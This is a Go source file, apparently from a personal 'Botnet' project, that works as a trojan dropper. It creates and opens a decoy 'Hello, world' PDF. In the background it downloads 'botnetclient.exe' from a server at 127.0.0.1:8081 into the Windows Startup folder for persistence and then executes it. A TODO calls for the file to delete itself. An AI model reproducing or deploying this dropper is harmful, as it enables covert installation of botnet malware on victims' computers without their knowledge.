package main

import (
	"github.com/jung-kurt/gofpdf"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
var pdfName = filepath.Join(srcDir, "/files/hello.pdf")

//var clientName = filepath.Join(srcDir, "/files/downloadedclient.exe")

var home, err = os.UserHomeDir()

var clientName = filepath.Join(home, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\botnetclient.exe")

func createpdf() {
	//create pdf
	pdf := gofpdf.New("P", "mm", "A4", "")
	pdf.AddPage()
	pdf.SetFont("Arial", "B", 16)
	pdf.Cell(40, 10, "Hello, world")
	err := pdf.OutputFileAndClose(pdfName)
	if err != nil {
		log.Println("Error:", err)
	}
}

func openpdf() {
	//open pdf
	cmd1 := exec.Command("cmd.exe", "/C", "start", pdfName)
	if err := cmd1.Run(); err != nil {
		log.Println("Error:", err)
	}
}

func getclient() {
	//download client
	// Create the file
	out, err := os.Create(clientName)
	if err != nil {
		log.Fatalf("An Error Occured %v", err)
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get("http://127.0.0.1:8081/client")
	if err != nil {
		log.Fatalf("An Error Occured %v", err)
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		log.Fatalf("bad status: %s", resp.Status)
	}

	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		log.Fatalf("An Error Occured %v", err)
	}
}

func runclient() {
	err := exec.Command(clientName).Run()
	if err != nil {
		log.Fatalf("An Error Occured %v", err)
	}
}

func main() {
	createpdf()

	openpdf()

	go getclient()

	time.Sleep(time.Second)

	go runclient()

	time.Sleep(time.Second)

	//TODO delete itself
}
